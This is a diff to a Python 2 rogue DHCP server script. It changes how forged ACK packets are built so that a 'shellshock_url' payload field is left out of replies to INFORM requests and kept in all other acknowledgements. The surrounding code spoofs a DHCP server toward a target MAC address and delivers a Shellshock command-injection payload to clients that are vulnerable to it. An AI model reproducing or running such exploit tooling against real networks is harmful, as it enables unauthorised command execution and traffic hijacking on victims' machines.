@@ -129,23 +129,40 @@ def make_dhcp_offer_packet(transaction_id):
                                      url=None)
 
 
-def make_dhcp_ack_packet(transaction_id, requested_ip, your_ip=None):
+def make_dhcp_ack_packet(transaction_id, requested_ip, your_ip=None, url=True):
     if your_ip is None:
         your_ip = requested_ip
-    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
-                                     destination_mac=target_mac_address,
-                                     source_ip=dhcp_server_ip_address,
-                                     destination_ip=requested_ip,
-                                     transaction_id=transaction_id,
-                                     your_ip=your_ip,
-                                     client_mac=target_mac_address,
-                                     dhcp_server_id=dhcp_server_ip_address,
-                                     lease_time=args.lease_time,
-                                     netmask=network_mask,
-                                     router=router_ip_address,
-                                     dns=dns_server_ip_address,
-                                     dhcp_operation=5,
-                                     url=shellshock_url)
+    if url:
+        return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                         destination_mac=target_mac_address,
+                                         source_ip=dhcp_server_ip_address,
+                                         destination_ip=requested_ip,
+                                         transaction_id=transaction_id,
+                                         your_ip=your_ip,
+                                         client_mac=target_mac_address,
+                                         dhcp_server_id=dhcp_server_ip_address,
+                                         lease_time=args.lease_time,
+                                         netmask=network_mask,
+                                         router=router_ip_address,
+                                         dns=dns_server_ip_address,
+                                         dhcp_operation=5,
+                                         url=shellshock_url)
+    else:
+        return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                         destination_mac=target_mac_address,
+                                         source_ip=dhcp_server_ip_address,
+                                         destination_ip=requested_ip,
+                                         transaction_id=transaction_id,
+                                         your_ip=your_ip,
+                                         client_mac=target_mac_address,
+                                         dhcp_server_id=dhcp_server_ip_address,
+                                         lease_time=args.lease_time,
+                                         netmask=network_mask,
+                                         router=router_ip_address,
+                                         dns=dns_server_ip_address,
+                                         dhcp_operation=5,
+                                         url=None)
+
 
 def make_dhcp_nak_packet(transaction_id, requested_ip):
     return dhcp.make_nak_packet(source_mac=dhcp_server_mac_address,
@@ -193,7 +210,7 @@ def dhcp_reply(request):
             requested_ip = ciaddr
             print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
                   " || requested ip: " + requested_ip
-            ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip, "0.0.0.0")
+            ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip, "0.0.0.0", False)
             SOCK.send(ack_packet)
             print "[INFO] Send inform ack response!"
 
